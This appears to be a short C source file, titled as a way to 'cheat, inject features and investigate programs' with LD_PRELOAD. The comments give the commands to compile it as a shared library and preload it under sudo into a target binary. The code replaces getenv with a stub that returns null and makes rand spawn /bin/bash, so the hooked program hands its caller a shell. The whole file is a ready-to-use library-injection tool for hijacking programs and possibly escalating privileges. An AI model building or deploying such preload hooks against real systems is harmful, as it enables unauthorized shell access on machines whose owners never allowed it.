// Using LD_PRELOAD to cheat, inject features and investigate programs
// gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so
// sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft


#include <stdlib.h>

char *getenv(const char *name){
return 0;
}

int rand(){
system("/bin/bash");
return 42; //the most random number in the universe
}